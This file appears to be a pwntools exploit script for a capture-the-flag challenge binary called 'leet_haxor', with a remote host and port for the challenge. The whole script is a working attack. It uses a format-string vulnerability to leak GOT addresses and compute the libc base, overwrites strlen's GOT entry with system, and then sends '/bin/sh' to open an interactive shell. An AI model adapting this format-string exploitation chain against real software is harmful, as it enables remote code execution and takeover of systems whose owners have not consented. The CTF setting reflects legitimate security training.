#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug'
context.terminal = 'tmux split -h'.split(' ')
context.arch = 'amd64'

elf = ELF('leet_haxor')

if args.REMOTE:
    p = remote('jh2i.com', 50022)
    libc = ELF('libc.so')
else:
    p = process(elf.path)
    libc = elf.libc

def choose(choice):
    p.sendlineafter(b'exit\n', choice)

def leetify(content):
    choose(b'0')
    p.sendlineafter(b':\n', content)

def unleetify(content):
    choose(b'1')
    p.sendlineafter(b':\n', content)

# Leak fgets and puts addresses
## libc version: libc6_2.27-3ubuntu1_amd64

payload = b'%p' * 24 + b'.%s.%s.\x00' + p64(elf.got.fgets) + p64(elf.got.puts)
unleetify(payload)

p.recvuntil(b'.')
fgets_addr = u64(p.recvuntil(b'.')[:-1].ljust(8, b'\x00'))
puts_addr = u64(p.recvuntil(b'.')[:-1].ljust(8, b'\x00'))
libc.address = fgets_addr - libc.sym.fgets

log.info(f'fgets @ {hex(fgets_addr)}')
log.info(f'puts @ {hex(puts_addr)}')
log.info(f'libc @ {hex(libc.address)}')
log.info(f'system @ {hex(libc.sym.system)}')

# Overwrite strlen.got with system address

payload = fmtstr_payload(18, {elf.got.strlen: libc.sym.system}, write_size='short').replace(b'll', b'').replace(b'25$hn', b'25$hn  ')
log.info(f'payload = {payload} ({len(payload)})')

leetify(payload)

# Execute system('/bin/sh')

leetify(b'/bin/sh\x00')

p.interactive()
